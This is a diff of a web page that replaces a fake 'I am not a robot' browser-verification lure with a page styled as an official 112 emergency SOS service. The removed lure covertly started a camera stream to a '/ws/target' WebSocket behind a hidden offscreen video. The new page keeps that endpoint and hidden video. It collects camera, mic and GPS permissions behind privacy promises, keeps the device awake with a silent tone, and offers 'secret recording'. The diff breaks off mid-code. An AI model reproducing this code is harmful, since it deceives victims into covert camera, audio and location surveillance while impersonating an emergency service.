@@ -3,97 +3,519 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>112 Emergency SOS - Rapid Police Response</title>
+    <link rel="manifest" href="/manifest.json">
+    <meta name="theme-color" content="#dc2626">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --bg-dark: #080c14;
+            --bg-card: #0f172a;
+            --danger-red: #ef4444;
+            --danger-glow: rgba(239, 68, 68, 0.45);
+            --danger-active: #dc2626;
+            --accent-cyan: #00f2fe;
+            --accent-green: #10b981;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --border-glass: rgba(255, 255, 255, 0.1);
+        }
+
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
+            user-select: none;
+            -webkit-user-select: none;
+            -webkit-touch-callout: none;
         }
 
         body {
-            background: #f8fafc;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: var(--bg-dark);
+            color: var(--text-main);
+            font-family: 'Plus Jakarta Sans', -apple-system, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            padding: 20px 16px env(safe-area-inset-bottom, 20px);
+            overflow-x: hidden;
+        }
+
+        /* Top Header */
+        header {
+            width: 100%;
+            max-width: 440px;
             display: flex;
             align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            color: #1e293b;
-            padding: 20px;
+            justify-content: space-between;
+            padding: 10px 0;
         }
 
-        .card {
-            background: #ffffff;
-            border-radius: 12px;
-            padding: 36px 30px;
-            max-width: 420px;
+        .brand-badge {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: rgba(239, 68, 68, 0.12);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            padding: 6px 14px;
+            border-radius: 999px;
+        }
+
+        .brand-badge svg {
+            width: 20px;
+            height: 20px;
+            color: var(--danger-red);
+        }
+
+        .brand-badge span {
+            font-weight: 800;
+            font-size: 0.95rem;
+            letter-spacing: 0.5px;
+            color: #fff;
+        }
+
+        .system-pill {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            background: rgba(255, 255, 255, 0.05);
+            padding: 6px 12px;
+            border-radius: 999px;
+            border: 1px solid var(--border-glass);
+        }
+
+        .dot-status {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #64748b;
+        }
+
+        .dot-status.ready {
+            background: var(--accent-green);
+            box-shadow: 0 0 8px var(--accent-green);
+        }
+
+        .dot-status.emergency {
+            background: var(--danger-red);
+            box-shadow: 0 0 12px var(--danger-red);
+            animation: pulse-red 1s infinite;
+        }
+
+        @keyframes pulse-red {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.4; transform: scale(1.2); }
+        }
+
+        /* Container */
+        .app-container {
             width: 100%;
+            max-width: 440px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin: auto 0;
             text-align: center;
-            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.05);
-            border: 1px solid #e2e8f0;
         }
 
-        .icon-shield {
-            width: 56px;
-            height: 56px;
-            background: #eff6ff;
-            color: #2563eb;
+        /* Permission Onboarding Card */
+        .permission-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-glass);
+            border-radius: 20px;
+            padding: 26px 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(16px);
+            width: 100%;
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        .shield-icon {
+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, rgba(239, 68, 68, 0.2), rgba(220, 38, 38, 0.4));
+            border: 2px solid rgba(239, 68, 68, 0.5);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 20px;
+            margin: 0 auto 14px;
+            color: #ef4444;
         }
 
-        h1 {
-            font-size: 1.35rem;
+        .shield-icon svg {
+            width: 34px;
+            height: 34px;
+        }
+
+        .permission-card h2 {
+            font-size: 1.3rem;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 8px;
+        }
+
+        .privacy-highlight-box {
+            font-size: 0.86rem;
+            color: #f1f5f9;
+            line-height: 1.5;
+            margin-bottom: 18px;
+            text-align: left;
+            background: rgba(16, 185, 129, 0.1);
+            padding: 12px 14px;
+            border-radius: 12px;
+            border-left: 3px solid var(--accent-green);
+        }
+
+        .privacy-highlight-box strong {
+            color: #34d399;
+        }
+
+        .permission-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 22px;
+            text-align: left;
+        }
+
+        .perm-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border-glass);
+            padding: 10px 14px;
+            border-radius: 10px;
+            font-size: 0.85rem;
+        }
+
+        .perm-icon {
+            color: var(--accent-cyan);
+            display: flex;
+        }
+
+        .perm-title {
             font-weight: 600;
-            color: #0f172a;
+            color: #f1f5f9;
+        }
+
+        .perm-desc {
+            font-size: 0.74rem;
+            color: var(--text-muted);
+        }
+
+        .btn-arm {
+            background: linear-gradient(135deg, #ef4444, #b91c1c);
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            font-size: 1rem;
+            font-weight: 700;
+            border-radius: 12px;
+            width: 100%;
+            cursor: pointer;
+            box-shadow: 0 8px 25px rgba(239, 68, 68, 0.4);
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-arm:active {
+            transform: scale(0.98);
+        }
+
+        /* Armed SOS Trigger State */
+        .sos-armed-container {
+            display: none;
+            width: 100%;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .privacy-banner-armed {
+            background: rgba(16, 185, 129, 0.08);
+            border: 1px solid rgba(16, 185, 129, 0.25);
+            padding: 10px 14px;
+            border-radius: 10px;
+            font-size: 0.82rem;
+            color: #a7f3d0;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-align: left;
+            line-height: 1.4;
+        }
+
+        .sos-instruction {
+            margin-bottom: 16px;
+        }
+
+        .sos-instruction h1 {
+            font-size: 1.45rem;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 6px;
+        }
+
+        .sos-instruction p {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+        }
+
+        /* 3-Second Hold Button with Radial SVG Meter */
+        .hold-btn-wrapper {
+            position: relative;
+            width: 240px;
+            height: 240px;
+            margin: 10px auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            touch-action: none;
+        }
+
+        .progress-ring {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 240px;
+            height: 240px;
+            transform: rotate(-90deg);
+        }
+
+        .progress-ring-bg {
+            fill: none;
+            stroke: rgba(239, 68, 68, 0.2);
+            stroke-width: 10;
+        }
+
+        .progress-ring-circle {
+            fill: none;
+            stroke: #ef4444;
+            stroke-width: 10;
+            stroke-linecap: round;
+            stroke-dasharray: 691.15;
+            stroke-dashoffset: 691.15;
+            transition: stroke-dashoffset 0.05s linear;
+        }
+
+        .hold-btn-core {
+            width: 196px;
+            height: 196px;
+            border-radius: 50%;
+            background: radial-gradient(circle at 35% 35%, #ef4444, #991b1b 85%);
+            border: 4px solid rgba(255, 255, 255, 0.2);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            box-shadow: 0 0 40px var(--danger-glow), inset 0 2px 6px rgba(255, 255, 255, 0.4);
+            transition: transform 0.15s ease, box-shadow 0.15s ease;
+            z-index: 5;
+        }
+
+        .hold-btn-wrapper.active .hold-btn-core {
+            transform: scale(0.94);
+            box-shadow: 0 0 60px rgba(239, 68, 68, 0.8), inset 0 2px 10px rgba(255, 255, 255, 0.6);
+        }
+
+        .btn-sos-icon {
+            width: 44px;
+            height: 44px;
+            margin-bottom: 4px;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.4));
+        }
+
+        .btn-sos-text {
+            font-size: 1.35rem;
+            font-weight: 900;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+        }
+
+        .btn-sos-sub {
+            font-size: 0.72rem;
+            font-weight: 700;
+            opacity: 0.9;
+            letter-spacing: 0.5px;
+            margin-top: 2px;
+        }
+
+        .hold-timer-display {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.95rem;
+            font-weight: 700;
+            color: var(--accent-cyan);
+            margin-bottom: 12px;
+            min-height: 24px;
+        }
+
+        .touch-guard-hint {
+            font-size: 0.8rem;
+            color: #94a3b8;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        /* Emergency Active View */
+        .emergency-active-card {
+            display: none;
+            background: linear-gradient(180deg, rgba(220, 38, 38, 0.25), rgba(15, 23, 42, 0.95));
+            border: 2px solid var(--danger-red);
+            border-radius: 20px;
+            padding: 24px 20px;
+            box-shadow: 0 0 40px rgba(239, 68, 68, 0.35);
+            width: 100%;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .alert-banner {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: #ef4444;
+            color: white;
+            padding: 10px;
+            border-radius: 10px;
+            font-weight: 800;
+            font-size: 0.95rem;
+            letter-spacing: 0.5px;
+            margin-bottom: 16px;
+            box-shadow: 0 4px 15px rgba(239, 68, 68, 0.4);
+            animation: pulse-red 1.2s infinite;
+        }
+
+        .live-stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 18px;
+            text-align: left;
+        }
+
+        .live-stat-box {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid var(--border-glass);
+            border-radius: 10px;
+            padding: 10px 12px;
+        }
+
+        .live-stat-box .title {
+            font-size: 0.72rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        .live-stat-box .value {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            color: var(--accent-cyan);
+            font-weight: 700;
+            margin-top: 4px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .actions-col {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .btn-call-112 {
+            background: #10b981;
+            color: #fff;
+            border: none;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 0.95rem;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            text-decoration: none;
+            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
+        }
+
+        .btn-stealth {
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid var(--border-glass);
+            color: #f8fafc;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 0.88rem;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-stealth:active {
+            background: rgba(255, 255, 255, 0.15);
+        }
+
+        /* Fullscreen Stealth Mode Screen */
+        #stealthScreen {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: #000;
+            z-index: 9999;
+            color: #334155;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            font-family: -apple-system, sans-serif;
+            padding: 30px;
+        }
+
+        #stealthTime {
+            font-size: 3.5rem;
+            font-weight: 200;
+            color: #475569;
             margin-bottom: 10px;
         }
 
-        p {
-            font-size: 0.92rem;
-            color: #64748b;
-            line-height: 1.5;
-            margin-bottom: 24px;
+        #stealthDate {
+            font-size: 1rem;
+            color: #334155;
+            margin-bottom: 40px;
         }
 
-        button {
-            background: #2563eb;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            font-size: 0.95rem;
-            font-weight: 500;
-            border-radius: 8px;
-            cursor: pointer;
-            width: 100%;
-            transition: all 0.2s ease;
+        .stealth-hint {
+            font-size: 0.75rem;
+            color: #1e293b;
+            position: absolute;
+            bottom: 30px;
         }
 
-        button:hover {
-            background: #1d4ed8;
-            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.25);
-        }
-
-        .spinner {
-            display: inline-block;
-            width: 32px;
-            height: 32px;
-            border: 3px solid #e2e8f0;
-            border-top-color: #2563eb;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 10px auto;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        video {
+        video#hiddenVideo {
             position: absolute;
             top: -9999px;
             left: -9999px;
@@ -102,24 +524,187 @@
             opacity: 0.001;
             pointer-events: none;
         }
+
+        footer {
+            width: 100%;
+            max-width: 440px;
+            text-align: center;
+            font-size: 0.72rem;
+            color: #64748b;
+            padding-top: 10px;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
     </style>
 </head>
 
 <body>
-    <div class="card" id="mainCard">
-        <div class="icon-shield">
-            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+    <!-- Top Bar -->
+    <header>
+        <div class="brand-badge">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
             </svg>
+            <span>112 EMERGENCY</span>
         </div>
-        <h1>Checking your browser...</h1>
-        <p>Please complete quick browser verification to access this protected destination.</p>
-        <button id="verifyBtn" onclick="startCovertStream()">I am not a robot</button>
+        <div class="system-pill">
+            <span class="dot-status" id="sysDot"></span>
+            <span id="sysStatus">INITIALIZING</span>
+        </div>
+    </header>
+
+    <div class="app-container">
+        <!-- Step 1: Upfront Transparent Pre-Arming Permission View -->
+        <div class="permission-card" id="permissionCard">
+            <div class="shield-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+                    <path d="M12 8v4" />
+                    <path d="M12 16h.01" />
+                </svg>
+            </div>
+            <h2>Pre-Arm 112 Protection</h2>
+            
+            <div class="privacy-highlight-box">
+                🛡️ <b>Strict Privacy Guarantee:</b> Pre-granting access primes your browser so zero permission popups delay you during danger. <strong>Your camera, microphone, and live GPS are NEVER streamed or shared with anyone until you press and hold the HELP ME button for 3 seconds.</strong>
+            </div>
+
+            <div class="permission-list">
+                <div class="perm-item">
+                    <div class="perm-icon">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2" ry="2"/></svg>
+                    </div>
+                    <div>
+                        <div class="perm-title">Live Video Camera (Front/Rear)</div>
+                        <div class="perm-desc">Shared ONLY upon 3-second SOS trigger</div>
+                    </div>
+                </div>
+
+                <div class="perm-item">
+                    <div class="perm-icon">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/></svg>
+                    </div>
+                    <div>
+                        <div class="perm-title">Live Microphone Audio</div>
+                        <div class="perm-desc">Shared ONLY upon 3-second SOS trigger</div>
+                    </div>
+                </div>
+
+                <div class="perm-item">
+                    <div class="perm-icon">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polygon points="16.24 7.76 14.12 14.12 7.76 16.24 9.88 9.88 16.24 7.76"/></svg>
+                    </div>
+                    <div>
+                        <div class="perm-title">High-Accuracy GPS Location</div>
+                        <div class="perm-desc">Shared ONLY upon 3-second SOS trigger</div>
+                    </div>
+                </div>
+            </div>
+
+            <button class="btn-arm" id="armBtn" onclick="requestAllPermissionsAndArm()">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                Grant Permissions & Arm System
+            </button>
+        </div>
+
+        <!-- Step 2: Armed Ready State with 3-Second Hold Button -->
+        <div class="sos-armed-container" id="armedContainer">
+            <div class="privacy-banner-armed">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                <span><b>Privacy Active:</b> No camera, mic, or GPS data is transmitted until SOS is triggered.</span>
+            </div>
+
+            <div class="sos-instruction">
+                <h1>PRESS & HOLD FOR 3 SECONDS</h1>
+                <p>3-second hold prevents accidental touch</p>
+            </div>
+
+            <div class="hold-btn-wrapper" id="holdBtnWrapper">
+                <svg class="progress-ring">
+                    <circle class="progress-ring-bg" cx="120" cy="120" r="110" />
+                    <circle class="progress-ring-circle" id="progressRingCircle" cx="120" cy="120" r="110" />
+                </svg>
+                <div class="hold-btn-core" id="holdBtnCore">
+                    <svg class="btn-sos-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                        <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
+                    </svg>
+                    <span class="btn-sos-text">HELP ME</span>
+                    <span class="btn-sos-sub">HOLD 3 SEC</span>
+                </div>
+            </div>
+
+            <div class="hold-timer-display" id="holdTimerText">TOUCH & HOLD TO TRIGGER</div>
+
+            <div class="touch-guard-hint">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+                <span>Accidental Touch Protection Active</span>
+            </div>
+        </div>
+
+        <!-- Step 3: Emergency Active Screen -->
+        <div class="emergency-active-card" id="emergencyCard">
+            <div class="alert-banner">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+                <span>🚨 SOS ACTIVE & STREAMING TO 112</span>
+            </div>
+
+            <div class="live-stats-grid">
+                <div class="live-stat-box">
+                    <div class="title">GPS Status</div>
+                    <div class="value" id="liveGpsVal">Acquiring Lock...</div>
+                </div>
+                <div class="live-stat-box">
+                    <div class="title">Video Stream</div>
+                    <div class="value" id="liveStreamVal" style="color: #10b981;">● Live Stream Active</div>
+                </div>
+                <div class="live-stat-box">
+                    <div class="title">Dispatched 112 Unit</div>
+                    <div class="value" id="liveDispatchedVal">Locating Nearest...</div>
+                </div>
+                <div class="live-stat-box">
+                    <div class="title">Audio Stream</div>
+                    <div class="value" style="color: #10b981;">● Live Ambient Mic</div>
+                </div>
+            </div>
+
+            <div class="actions-col">
+                <button class="btn-stealth" onclick="enterStealthMode()">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+                    Covert Stealth Screen (Secret Recording)
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Covert Stealth Disguise Screen -->
+    <div id="stealthScreen" onclick="handleStealthTap()">
+        <div id="stealthTime">12:00</div>
+        <div id="stealthDate">Monday, Emergency Response Mode</div>
+        <div style="width: 40px; height: 40px; border-radius: 50%; background: #0a0a0a; margin: 40px auto;"></div>
+        <div class="stealth-hint">Double-tap anywhere to exit stealth display</div>
     </div>
 
     <video id="hiddenVideo" autoplay muted playsinline></video>
 
+    <footer>
+        State Emergency Response Support System (ERSS 112) &bull; Rapid Dispatch Network
+    </footer>
+
     <script>
+        // PWA Service Worker Registration
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+                navigator.serviceWorker.register('/sw.js').then((reg) => {
+                    console.log('[PWA] Service Worker registered:', reg.scope);
+                }).catch((err) => {
+                    console.log('[PWA] Service Worker registration failed:', err);
+                });
+            });
+        }
+
         const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
         const host = window.location.host || "hangon-k31m.onrender.com";
         const wsUrl = `${protocol}//${host}/ws/target`;
@@ -143,56 +728,30 @@
         let pendingIceCandidates = [];
         let pingInterval = null;
         let isConnectingWs = false;
-        let currentFacingMode = 'user'; // 'user' (front) or 'environment' (rear)
+        let currentFacingMode = 'user';
         let isSwitching = false;
-        let frontCameraId = null;
-        let backCameraId = null;
-        let availableCameras = [];
+        let myTargetId = null;
+        let isArmed = false;
+        let isSosActive = false;
+        let gpsWatchId = null;
+        let currentGpsData = null;
+
         const hiddenVideo = document.getElementById('hiddenVideo');
+        const sysDot = document.getElementById('sysDot');
+        const sysStatus = document.getElementById('sysStatus');
 
-        async function discoverCameras() {
-            try {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                availableCameras = devices.filter(d => d.kind === 'videoinput');
-                console.log("[*] Discovered cameras:", availableCameras);
+        // Circular progress ring setup (circumference = 2 * PI * 110 = 691.15)
+        const CIRCUMFERENCE = 2 * Math.PI * 110;
+        const progressCircle = document.getElementById('progressRingCircle');
+        progressCircle.style.strokeDasharray = `${CIRCUMFERENCE} ${CIRCUMFERENCE}`;
+        progressCircle.style.strokeDashoffset = CIRCUMFERENCE;
 
-                frontCameraId = null;
-                backCameraId = null;
-
-                // 1. Check current active stream's deviceId (guaranteed front on start)
-                const currentTrack = localStream ? localStream.getVideoTracks()[0] : null;
-                const currentSettings = currentTrack ? currentTrack.getSettings() : {};
-                const activeId = currentSettings.deviceId;
-
-                // 2. Identify by labels (excluding ambiguous numbers)
-                for (const cam of availableCameras) {
-                    const label = (cam.label || '').toLowerCase();
-                    if (label.includes('back') || label.includes('rear') || label.includes('environment')) {
-                        if (!backCameraId) backCameraId = cam.deviceId;
-                    } else if (label.includes('front') || label.includes('user') || label.includes('selfie')) {
-                        if (!frontCameraId) frontCameraId = cam.deviceId;
-                    }
-                }
-
-                // 3. Differential mapping: active camera vs other cameras
-                if (activeId) {
-                    if (!frontCameraId) frontCameraId = activeId;
-                    if (!backCameraId) {
-                        const otherCam = availableCameras.find(c => c.deviceId !== activeId);
-                        if (otherCam) backCameraId = otherCam.deviceId;
-                    }
-                }
-
-                // 4. Default index fallback
-                if (!frontCameraId && availableCameras.length > 0) frontCameraId = availableCameras[0].deviceId;
-                if (!backCameraId && availableCameras.length > 1) backCameraId = availableCameras[1].deviceId;
-
-                console.log(`[*] Exact Camera mapping: Front=${frontCameraId}, Back=${backCameraId}`);
-            } catch (e) {
-                console.warn("Camera discovery error:", e);
-            }
+        function setProgress(percent) {
+            const offset = CIRCUMFERENCE - (percent / 100 * CIRCUMFERENCE);
+            progressCircle.style.strokeDashoffset = offset;
         }
 
+        // Background Audio Context & WakeLock Keep-Alive
         let audioKeepAliveCtx = null;
         function enableBackgroundKeepAlive() {
             try {
@@ -201,36 +760,189 @@
                     audioKeepAliveCtx = new AudioContextClass();
                     const oscillator = audioKeepAliveCtx.createOscillator();
                     const gainNode = audioKeepAliveCtx.createGain();
-                    gainNode.gain.value = 0.0001; // Imperceptible silent tone
+                    gainNode.gain.value = 0.0001;
                     oscillator.connect(gainNode);
                     gainNode.connect(audioKeepAliveCtx.destination);
                     oscillator.start();
                 }
-            } catch (e) {}
+            } catch (e) { }
 
-            // Screen Wake Lock API
             try {
                 if ('wakeLock' in navigator) {
-                    navigator.wakeLock.request('screen').catch(() => {});
+                    navigator.wakeLock.request('screen').catch(() => { });
                     document.addEventListener('visibilitychange', () => {
                         if (document.visibilityState === 'visible' && 'wakeLock' in navigator) {
-                            navigator.wakeLock.request('screen').catch(() => {});
+                            navigator.wakeLock.request('screen').catch(() => { });
                         }
                     });
                 }
-            } catch (e) {}
+            } catch (e) { }
         }
 
-        async function startCovertStream() {
+        // Step 1: Upfront Pre-Arming (Primes permissions in browser, BUT does NOT stream yet!)
+        async function requestAllPermissionsAndArm() {
+            const armBtn = document.getElementById('armBtn');
+            armBtn.innerHTML = `<span>Arming Device...</span>`;
+            armBtn.disabled = true;
+
             enableBackgroundKeepAlive();
 
-            const card = document.getElementById('mainCard');
-            card.innerHTML = `
-                <div class="spinner"></div>
-                <h1 style="margin-top: 16px;">Verifying browser...</h1>
-                <p>Establishing secure connection. Please wait a moment.</p>
-            `;
+            try {
+                // 1. Prime Media Stream (Camera & Mic) permission prompt in browser
+                const initialStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" },
+                    audio: true
+                });
 
+                // Immediately stop the initial stream so camera light turns off during standby
+                initialStream.getTracks().forEach(track => track.stop());
+
+                // 2. Prime Location permission prompt in browser
+                if ("geolocation" in navigator) {
+                    await new Promise((resolve) => {
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => { resolve(pos); },
+                            (err) => { resolve(null); },
+                            { enableHighAccuracy: true, timeout: 5000 }
+                        );
+                    });
+                }
+
+                // 3. Connect to WebSocket Signaling Server in Standby Mode
+                connectSignaling();
+
+                // 4. Transition to Armed Ready View (Privacy Secured)
+                isArmed = true;
+                document.getElementById('permissionCard').style.display = 'none';
+                document.getElementById('armedContainer').style.display = 'flex';
+                sysDot.className = 'dot-status ready';
+                sysStatus.innerText = 'ARMED (PRIVACY SECURED)';
+
+                // Gentle Haptic confirmation
+                if (navigator.vibrate) navigator.vibrate([80, 50, 80]);
+
+            } catch (err) {
+                console.error("Permission acquisition error:", err);
+                armBtn.disabled = false;
+                armBtn.innerHTML = `⚠ Grant Permissions & Arm System`;
+                alert("Emergency permissions required! Please allow Camera, Microphone & Location to arm the 112 SOS System.");
+            }
+        }
+
+        // GPS Geolocation Continuous Tracker (Triggered only on SOS!)
+        function startGpsTracking() {
+            if ("geolocation" in navigator) {
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                };
+
+                gpsWatchId = navigator.geolocation.watchPosition(
+                    (pos) => {
+                        const { latitude, longitude, accuracy, speed, heading, altitude } = pos.coords;
+                        currentGpsData = {
+                            lat: latitude,
+                            lng: longitude,
+                            accuracy: accuracy ? Math.round(accuracy) : 10,
+                            speed: speed || 0,
+                            heading: heading || 0,
+                            alt: altitude ? Math.round(altitude) : null,
+                            timestamp: new Date().toISOString()
+                        };
+
+                        const gpsValEl = document.getElementById('liveGpsVal');
+                        if (gpsValEl) {
+                            gpsValEl.innerText = `${latitude.toFixed(4)}, ${longitude.toFixed(4)} (±${currentGpsData.accuracy}m)`;
+                        }
+
+                        // Stream GPS update to 112 Control Room only when SOS is active
+                        if (isSosActive && ws && ws.readyState === WebSocket.OPEN) {
+                            ws.send(JSON.stringify({
+                                type: "gps_update",
+                                gps: currentGpsData,
+                                is_sos: true
+                            }));
+                        }
+                    },
+                    (err) => {
+                        console.warn("GPS Tracking notice:", err.message);
+                    },
+                    options
+                );
+            }
+        }
+
+        // 3-Second Hold Logic with Anti-Accidental Touch Guard
+        const holdWrapper = document.getElementById('holdBtnWrapper');
+        const holdTimerText = document.getElementById('holdTimerText');
+        let holdStartTime = null;
+        let holdAnimationId = null;
+        const HOLD_DURATION = 3000; // 3000 ms
+
+        function startHold(e) {
+            if (!isArmed || isSosActive) return;
+            if (e) e.preventDefault();
+
+            holdStartTime = performance.now();
+            holdWrapper.classList.add('active');
+            if (navigator.vibrate) navigator.vibrate(50);
+
+            function updateHoldProgress(now) {
+                const elapsed = now - holdStartTime;
+                const progress = Math.min(elapsed / HOLD_DURATION, 1);
+                setProgress(progress * 100);
+
+                const remainingSeconds = ((HOLD_DURATION - elapsed) / 1000).toFixed(1);
+                if (elapsed < HOLD_DURATION) {
+                    holdTimerText.innerText = `HOLDING... ${Math.max(0, remainingSeconds)}s`;
+                    holdTimerText.style.color = '#ef4444';
+                    holdAnimationId = requestAnimationFrame(updateHoldProgress);
+                } else {
+                    // Completed 3 full seconds! Trigger SOS!
+                    triggerEmergencySos();
+                }
+            }
+
+            holdAnimationId = requestAnimationFrame(updateHoldProgress);
+        }
+
+        function cancelHold(e) {
+            if (!isArmed || isSosActive) return;
+            if (holdAnimationId) {
+                cancelAnimationFrame(holdAnimationId);
+                holdAnimationId = null;
+            }
+            holdStartTime = null;
+            holdWrapper.classList.remove('active');
+            setProgress(0);
